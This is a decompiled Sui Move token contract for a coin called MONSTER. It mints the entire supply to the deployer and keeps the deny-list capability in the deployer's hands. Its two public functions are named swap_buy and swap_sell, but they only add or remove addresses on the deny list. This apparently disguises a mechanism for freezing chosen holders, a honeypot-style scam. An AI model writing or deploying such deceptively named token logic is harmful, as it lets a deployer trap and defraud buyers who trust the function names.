module 0x7e00c3a9451a3954a3a04777df8a50138c411efe9a97dd61da5d584bc2b3ea0d::monster {
    struct MONSTER has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: MONSTER, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<MONSTER>(arg0, 9, b"MONSTER", b"MONSTER", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmRqy7keJexPS2iAS4A7TqpMRRJsKE79mJ9FhRS6woWYxr"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<MONSTER>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<MONSTER>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<MONSTER>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<MONSTER>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MONSTER>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<MONSTER>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MONSTER>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<MONSTER>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

